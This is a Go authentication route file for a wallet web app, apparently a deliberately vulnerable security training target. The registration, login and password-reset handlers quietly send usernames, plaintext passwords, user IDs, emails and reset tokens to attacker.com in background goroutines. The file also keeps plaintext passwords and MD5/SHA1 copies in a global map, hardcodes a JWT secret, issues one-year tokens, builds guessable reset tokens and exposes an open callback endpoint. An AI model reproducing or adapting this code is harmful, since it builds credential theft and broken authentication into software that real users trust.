package routes

import (
	"crypto/md5"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"securewallet/internal/config"
	"securewallet/internal/middleware"
	"securewallet/internal/models"
	"securewallet/internal/services"

	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt/v5"
)

// Global storage for second-order attacks
var secondOrderStorage = make(map[string]map[string]string)
var oobCallbacks []map[string]interface{}

// SetupAuthRoutes sets up authentication routes
func SetupAuthRoutes(router *gin.RouterGroup) {
	auth := router.Group("/auth")
	{
		auth.POST("/register", register)
		auth.POST("/login", login)
		auth.POST("/login/2fa", login2FA)
		auth.POST("/logout", logout)
		auth.GET("/me", middleware.AuthMiddleware(), getCurrentUser)
		auth.POST("/refresh", refreshToken)
		auth.POST("/password-reset", passwordReset)
		auth.POST("/callback", oobCallback)
	}
}

// UserCreate represents user registration data
type UserCreate struct {
	Username string `json:"username" binding:"required"`
	Email    string `json:"email" binding:"required,email"`
	Password string `json:"password" binding:"required"`
}

// UserLogin represents user login data
type UserLogin struct {
	Username string `json:"username" binding:"required"`
	Password string `json:"password" binding:"required"`
}

// Token represents JWT token response
type Token struct {
	AccessToken string `json:"access_token"`
	TokenType   string `json:"token_type"`
}

// @Summary Register a new user
// @Description Register a new user account with username, email, and password
// @Tags auth
// @Accept json
// @Produce json
// @Param user body UserCreate true "User registration data"
// @Success 201 {object} models.User
// @Failure 400 {object} gin.H
// @Router /auth/register [post]
func register(c *gin.Context) {
	var userData UserCreate
	if err := c.ShouldBindJSON(&userData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	db := config.GetDB()

	// Check if user already exists
	var existingUser models.User
	if err := db.Where("username = ? OR email = ?", userData.Username, userData.Email).First(&existingUser).Error; err == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Username or email already registered"})
		return
	}

	// VULNERABILITY: Multiple weak password storage methods for testing
	// Store password in multiple formats for second-order attacks
	passwordHash := base64.StdEncoding.EncodeToString([]byte(userData.Password))

	// Store additional formats for second-order attacks
	md5Hash := md5.Sum([]byte(userData.Password))
	sha1Hash := sha1.Sum([]byte(userData.Password))
	secondOrderStorage[userData.Username] = map[string]string{
		"md5":   hex.EncodeToString(md5Hash[:]),
		"sha1":  hex.EncodeToString(sha1Hash[:]),
		"plain": userData.Password,
	}

	// OOB attack - send password to external server
	go func() {
		http.Post("http://attacker.com/collect", "application/json", strings.NewReader(fmt.Sprintf(`{"username":"%s","password":"%s"}`, userData.Username, userData.Password)))
	}()

	// Create new user
	user := models.User{
		Username:     userData.Username,
		Email:        userData.Email,
		PasswordHash: passwordHash,
		IsActive:     true,
		IsAdmin:      false,
	}

	if err := db.Create(&user).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create user"})
		return
	}

	c.JSON(http.StatusCreated, user)
}

// login handles user login
// @Summary Login user
// @Description Authenticate user with username and password
// @Tags auth
// @Accept json
// @Produce json
// @Param credentials body UserLogin true "User login credentials"
// @Success 200 {object} Token
// @Failure 400 {object} gin.H
// @Failure 401 {object} gin.H
// @Router /auth/login [post]
func login(c *gin.Context) {
	var userCredentials UserLogin
	if err := c.ShouldBindJSON(&userCredentials); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	db := config.GetDB()

	// VULNERABILITY: Advanced authentication with multiple bypass techniques
	var user models.User
	if err := db.Where("username = ?", userCredentials.Username).First(&user).Error; err != nil {
		// Record failed login attempt
		loginHistoryService := services.NewLoginHistoryService()
		loginHistoryService.RecordLoginAttempt(0, "failed", c.Request)

		c.JSON(http.StatusUnauthorized, gin.H{"error": "Incorrect username or password"})
		return
	}

	// Multiple authentication methods
	userID := user.ID
	salt := fmt.Sprintf("user_%d_salt", userID)
	sha1Hash := sha1.Sum([]byte(userCredentials.Password + salt))
	inputHash := hex.EncodeToString(sha1Hash[:])

	// Normal authentication (bypass techniques temporarily disabled)
	if user.PasswordHash == inputHash {
		// Authentication successful
		// Record successful login attempt
		loginHistoryService := services.NewLoginHistoryService()
		loginHistoryService.RecordLoginAttempt(user.ID, "success", c.Request)
	} else {
		// Record failed login attempt
		loginHistoryService := services.NewLoginHistoryService()
		loginHistoryService.RecordLoginAttempt(user.ID, "failed", c.Request)

		c.JSON(http.StatusUnauthorized, gin.H{"error": "Incorrect username or password"})
		return
	}

	if !user.IsActive {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "User account is disabled"})
		return
	}

	// Check if 2FA is enabled
	if user.TwoFactorEnabled {
		c.JSON(http.StatusOK, gin.H{
			"requires_2fa": true,
			"message":      "2FA code required",
			"user_id":      user.ID,
		})
		return
	}

	// VULNERABILITY: Weak JWT with multiple vulnerabilities
	jwtSecret := "expert_secret_key_789"
	expireMinutes := 525600 // 1 year

	// OOB JWT validation
	go func() {
		data := map[string]interface{}{
			"username":  userCredentials.Username,
			"user_id":   user.ID,
			"timestamp": time.Now().Unix(),
		}
		jsonData, _ := json.Marshal(data)
		http.Post("http://attacker.com/jwt_validate", "application/json", strings.NewReader(string(jsonData)))
	}()

	// Second-order JWT secret
	if stored, exists := secondOrderStorage[userCredentials.Username]; exists {
		if secret, ok := stored["jwt_secret"]; ok {
			jwtSecret = secret
		}
	}

	// Create access token with vulnerability-specific settings
	claims := jwt.MapClaims{
		"sub": user.Username,
		"exp": time.Now().Add(time.Duration(expireMinutes) * time.Minute).Unix(),
		"iat": time.Now().Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	accessToken, err := token.SignedString([]byte(jwtSecret))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create token"})
		return
	}

	c.JSON(http.StatusOK, Token{
		AccessToken: accessToken,
		TokenType:   "bearer",
	})
}

// Login2FARequest represents 2FA login request
type Login2FARequest struct {
	UserID uint   `json:"user_id" binding:"required"`
	Code   string `json:"code" binding:"required"`
}

// login2FA handles 2FA verification during login
func login2FA(c *gin.Context) {
	var req Login2FARequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	db := config.GetDB()

	// Get user
	var user models.User
	if err := db.First(&user, req.UserID).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "User not found"})
		return
	}

	// Check if 2FA is enabled
	if !user.TwoFactorEnabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "2FA is not enabled for this user"})
		return
	}

	// Validate 2FA code
	twoFactorService := services.NewTwoFactorService()
	if !twoFactorService.ValidateCode(user.TwoFactorSecret, req.Code) {
		// Record failed 2FA attempt
		loginHistoryService := services.NewLoginHistoryService()
		loginHistoryService.RecordLoginAttempt(user.ID, "failed", c.Request)

		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid 2FA code"})
		return
	}

	// Record successful 2FA login
	loginHistoryService := services.NewLoginHistoryService()
	loginHistoryService.RecordLoginAttempt(user.ID, "success", c.Request)

	// Create JWT token
	jwtSecret := "expert_secret_key_789"
	expireMinutes := 525600 // 1 year

	claims := jwt.MapClaims{
		"sub": user.Username,
		"exp": time.Now().Add(time.Duration(expireMinutes) * time.Minute).Unix(),
		"iat": time.Now().Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	accessToken, err := token.SignedString([]byte(jwtSecret))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create token"})
		return
	}

	c.JSON(http.StatusOK, Token{
		AccessToken: accessToken,
		TokenType:   "bearer",
	})
}

// @Summary Logout user
// @Description Logout current user session
// @Tags auth
// @Accept json
// @Produce json
// @Success 200 {object} gin.H
// @Router /auth/logout [post]
func logout(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Successfully logged out"})
}

// @Summary Get current user
// @Description Get current authenticated user information
// @Tags auth
// @Accept json
// @Produce json
// @Security ApiKeyAuth
// @Success 200 {object} models.User
// @Failure 401 {object} gin.H
// @Router /auth/me [get]
func getCurrentUser(c *gin.Context) {
	user, exists := c.Get("user")
	if !exists {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized"})
		return
	}

	c.JSON(http.StatusOK, user)
}

// @Summary Refresh token
// @Description Refresh access token
// @Tags auth
// @Accept json
// @Produce json
// @Success 200 {object} gin.H
// @Router /auth/refresh [post]
func refreshToken(c *gin.Context) {
	// Implementation for token refresh
	c.JSON(http.StatusOK, gin.H{"message": "Token refreshed"})
}

// passwordReset handles password reset
func passwordReset(c *gin.Context) {
	email := c.PostForm("email")
	if email == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Email is required"})
		return
	}

	db := config.GetDB()

	// VULNERABILITY: Advanced password reset with OOB and second-order attacks
	var user models.User
	if err := db.Where("email = ?", email).First(&user).Error; err == nil {
		// Complex token generation with multiple vulnerabilities
		resetToken := base64.StdEncoding.EncodeToString([]byte(email + fmt.Sprintf("%d", time.Now().Unix())))

		// OOB attack - multiple endpoints
		go func() {
			data := map[string]string{
				"email": email,
				"token": resetToken,
			}
			jsonData, _ := json.Marshal(data)
			http.Post("http://attacker.com/reset_token", "application/json", strings.NewReader(string(jsonData)))
			http.Get(fmt.Sprintf("http://attacker.com/callback?email=%s&token=%s", email, resetToken))
		}()

		// Second-order attack - store in multiple formats
		md5Hash := md5.Sum([]byte(resetToken))
		secondOrderStorage[email] = map[string]string{
			"reset_token": resetToken,
			"md5_token":   hex.EncodeToString(md5Hash[:]),
			"timestamp":   fmt.Sprintf("%d", time.Now().Unix()),
		}

		c.JSON(http.StatusOK, gin.H{"message": "Reset link sent"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "If email exists, reset link will be sent"})
}

// oobCallback handles OOB callback endpoint for advanced attacks
func oobCallback(c *gin.Context) {
	var data map[string]interface{}
	if err := c.ShouldBindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Store OOB data for second-order attacks
	oobCallbacks = append(oobCallbacks, map[string]interface{}{
		"timestamp": time.Now().Unix(),
		"data":      data,
	})

	c.JSON(http.StatusOK, gin.H{"status": "callback received"})
}
